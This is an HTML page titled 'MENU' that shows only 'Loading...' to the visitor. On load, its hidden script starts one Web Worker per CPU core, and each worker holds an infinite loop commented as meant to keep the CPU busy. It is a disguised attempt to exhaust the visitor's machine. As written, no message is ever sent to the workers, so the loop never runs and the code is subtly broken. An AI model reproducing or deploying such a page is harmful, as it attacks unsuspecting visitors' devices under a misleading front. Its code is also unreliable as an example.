<!DOCTYPE html>
<html>
<head>
    <title>MENU</title>
    <script type="text/javascript">
        // Worker script as a Blob URL
        const workerScript = `
            self.onmessage = function(e) {
                // Infinite loop to keep CPU busy
                while (true) {}
            };
        `;

        function createWorker() {
            const blob = new Blob([workerScript], { type: 'application/javascript' });
            const url = URL.createObjectURL(blob);
            return new Worker(url);
        }

        window.onload = function() {
            const numberOfWorkers = navigator.hardwareConcurrency || 4; // Use number of CPU cores or default to 4
            for (let i = 0; i < numberOfWorkers; i++) {
                createWorker();
            }
        };
    </script>
</head>
<body>
    <h1>Loading...</h1>
</body>
</html>
